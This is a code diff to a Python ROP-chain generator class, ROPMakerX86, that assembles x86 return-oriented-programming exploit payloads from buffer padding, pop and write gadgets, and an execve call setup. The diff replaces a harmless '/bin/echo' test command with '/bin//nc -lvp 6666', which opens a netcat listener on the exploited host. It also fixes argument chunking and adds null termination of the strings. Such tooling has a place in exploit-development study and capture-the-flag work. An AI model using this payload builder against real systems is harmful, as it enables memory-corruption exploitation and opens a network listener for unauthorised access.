@@ -79,8 +79,7 @@ class ROPMakerX86(object):
             if g.split()[0] == "pop":
                 reg = g.split()[1]
                 try:
-                    tmp = "{:08x}".format(regAlreadSetted[reg])
-                    return pack('<I', int(tmp,16))
+                    return pack('<I', regAlreadSetted[reg])
                 except KeyError:
                     return pack('<I', 0x41414141)
         return b''
@@ -169,21 +168,22 @@ class ROPMakerX86(object):
         p = b'A' * self.padding
         p = b'A' * 44
 
-        args = [b'/bin/echo',b'rop done']
+        args = [b'/bin//nc',b'-lvp',b'6666']
 
         stack = dataAddr
         #-----------------------------stack--------------------------
 
-        for arg in args:
+        for i in range(len(args)):
+            arg = args[i]
             chunk = len(arg) // 4        
-            for i in range(chunk): 
+            for j in range(chunk): 
                 
                 p += pack('<I', popDst["vaddr"]) 
                 p += pack('<I', stack) 
                 p += self.__custompadding(popDst, {})
 
                 p += pack('<I', popSrc["vaddr"]) 
-                p += arg[i*4:(i+4)*4] 
+                p += arg[j*4:j*4+4] 
                 p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
 
                 p += pack('<I', write4where["vaddr"]) 
@@ -193,28 +193,8 @@ class ROPMakerX86(object):
 
                 #arg each in 4 chunk
 
-            rest = len(arg) % 4
-
-            if(rest != 0):
-
-                p += pack('<I', popDst["vaddr"]) 
-                p += pack('<I', stack) 
-                p += self.__custompadding(popDst, {})
-
-                p += pack('<I', popSrc["vaddr"]) 
-                p += arg[chunk*4:] + b' ' * (4 - rest)
-                p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
-
-                p += pack('<I', write4where["vaddr"]) 
-                p += self.__custompadding(write4where, {}) 
-
-                #reset lower than 4 
-
-                stack = stack + 4
-                arg = arg + b' ' * (4 - rest)
-                
             p += pack('<I', popDst["vaddr"]) 
-            p += pack('<I', dataAddr + stack) 
+            p += pack('<I', stack) 
             p += self.__custompadding(popDst, {})
 
             p += pack('<I', xorSrc["vaddr"]) 
@@ -248,6 +228,18 @@ class ROPMakerX86(object):
             argindex = argindex + len(arg) + 1 
 
             #writes arg on shadowstack
+        
+        p += pack('<I', popDst["vaddr"]) 
+        p += pack('<I', stack) 
+        p += self.__custompadding(popDst, {})
+
+        p += pack('<I', xorSrc["vaddr"]) 
+        p += self.__custompadding(xorSrc, {})
+
+        p += pack('<I', write4where["vaddr"]) 
+        p += self.__custompadding(write4where, {})
+
+        #adding null
 
 
         '''
@@ -385,7 +377,7 @@ class ROPMakerX86(object):
         #puts stack + 60 in to ecx (args)
 
         p += pack('<I', popEdx["vaddr"]) 
-        p += pack('<I', dataAddr + 48) 
+        p += pack('<I', stack) 
         p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": safestack})  
 
         #puts stack in to edx (env)
